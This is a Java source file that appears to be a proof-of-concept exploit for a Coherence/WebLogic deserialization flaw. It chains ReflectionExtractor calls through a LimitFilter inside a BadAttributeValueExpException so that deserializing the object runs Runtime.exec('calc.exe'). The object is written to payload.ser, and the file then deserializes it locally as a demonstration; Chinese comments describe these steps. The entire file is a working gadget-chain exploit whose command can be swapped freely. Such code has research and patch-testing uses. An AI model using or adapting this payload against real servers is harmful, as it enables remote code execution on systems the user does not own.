package com.axin;

import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.IdentityExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;

public class Main {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        ValueExtractor[] valueExtractors  = {
                new IdentityExtractor(),
                new ReflectionExtractor("getMethod", new Object[]{"getRuntime", null}),
                new ReflectionExtractor("invoke", new Object[]{null, null}),
                new ReflectionExtractor("exec", new Object[]{"calc.exe"})
        };
        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);
        LimitFilter limitFilter = new LimitFilter();
        limitFilter.setComparator(chainedExtractor);
        limitFilter.setBottomAnchor(Runtime.class);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        // 将序列化对象存储到payload.ser文件中
        File file = new File("./payload.ser");
        FileOutputStream fo = new FileOutputStream(file);
        ObjectOutputStream os = new ObjectOutputStream(fo);
        os.writeObject(badAttributeValueExpException);

        // 本地模拟从payload.ser文件反序列化恶意对象
        FileInputStream fi = new FileInputStream("./payload.ser");
        ObjectInputStream oi  = new ObjectInputStream(fi);
        oi.readObject();
    }
}
